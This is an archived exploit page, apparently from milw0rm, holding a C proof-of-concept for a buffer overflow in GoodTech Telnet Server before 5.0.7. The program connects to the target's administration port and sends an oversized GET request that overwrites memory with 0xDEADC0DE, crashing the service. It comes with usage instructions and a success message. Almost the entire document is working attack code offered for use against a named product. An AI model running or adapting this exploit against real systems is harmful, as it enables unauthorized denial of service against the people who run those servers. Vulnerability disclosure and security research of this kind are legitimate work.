<html>
<head>
<title>GoodTech Telnet Server < 5.0.7 Buffer Overflow Crash Exploit</title>
</head>
<pre>
/******************************************************************************************

	GoodTech Telnet Server Buffer Overflow Crash POC
	created by Komrade
	e-mail:	unsecure(at)altervista(dot)org
	web:	http://unsecure.altervista.org

	Tested on GoodTech Telnet Server versions 4.0 - 5.0 (versions prior to 5.0.7)
        on a Windows XP Professional sp2 operating system.

	This exploit connects to the Administration server of GoodTech Telnet Server
	(default port 2380) and sends a very long string (10040 bytes).
	After the exploit is sent the Telnet Server will crash, trying to access
	to a bad memory address: 0xDEADCODE.

	Usage: gtscrash.exe &quot;IP address&quot;

	Options:
	&quot;IP address&quot;	The IP address of the computer running GoodTech Telnet Server

*******************************************************************************************/

#include &lt;windows.h&gt;
#include &lt;winsock.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv)
{

	SOCKET sock;
	struct sockaddr_in sock_addr;
	WSADATA data;
	WORD p;
	p=MAKEWORD(2,0);
	WSAStartup(p,&amp;data);
	int i, n, err;
	unsigned char *mex;
	char risp[4096];

	printf(&quot;------------------------------------------------------------------------------\r\n&quot;);
	printf(&quot;\tGoodTech Telnet Server Buffer Overflow Crash POC\r\n&quot;);
	printf(&quot;\t\t\tcreated by Komrade\r\n\r\n&quot;);

	printf(&quot;\t\te-mail: unsecure(at)altervista(dot)org\r\n&quot;);
	printf(&quot;\t\tweb: http://unsecure.altervista.org\r\n&quot;);
	printf(&quot;------------------------------------------------------------------------------\r\n\r\n&quot;);


	if (argc &lt; 2){
		printf(&quot;Usage: gtscrash.exe \&quot;IP address\&quot;\r\n\r\n&quot;);
		printf(&quot;Options:\r\n&quot;);
		printf(&quot;IP address\tThe IP address of the computer running GoodTech Telnet Server\r\n&quot;);
		exit(0);
	}

	mex =(unsigned char *) LocalAlloc(LMEM_FIXED, 12000);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	sock_addr.sin_family=PF_INET;
	sock_addr.sin_port=htons(2380); /* Administration web server port */
	sock_addr.sin_addr.s_addr= inet_addr(argv[1]);

	err = connect(sock,(struct sockaddr*)&amp;sock_addr,sizeof(struct sockaddr));
	if(err&lt;0){
		printf(&quot;Unable to connect() to %s\n&quot;, argv[1]);
		exit(-1);
	}

	strcpy (mex, &quot;GET /&quot;);

	for(i = strlen(mex); i &lt; 10032; i++)
		mex[i]= 'a';
	mex[i]=0;

	strcat(mex, &quot;\xDE\xC0\xAD\xDE&quot;); /* Invalid IP address */
	strcat(mex, &quot;\r\n\r\n&quot;);

	printf(&quot;Sending %d bytes.....\n\n&quot;, strlen(mex));
	n=send(sock, mex , strlen(mex), 0);

	n=recv(sock, risp, sizeof(risp), 0);
	if (n &lt; 0)
		printf(&quot;GoodTech Telnet Server succesfully crashed!!\n&quot;);
	else{
		risp[n]=0;
		printf(&quot;%s\n&quot;, risp);
	}

	closesocket(sock);
	WSACleanup();
	return 0;
}

// milw0rm.com [2005-03-15]
</pre>
</html>

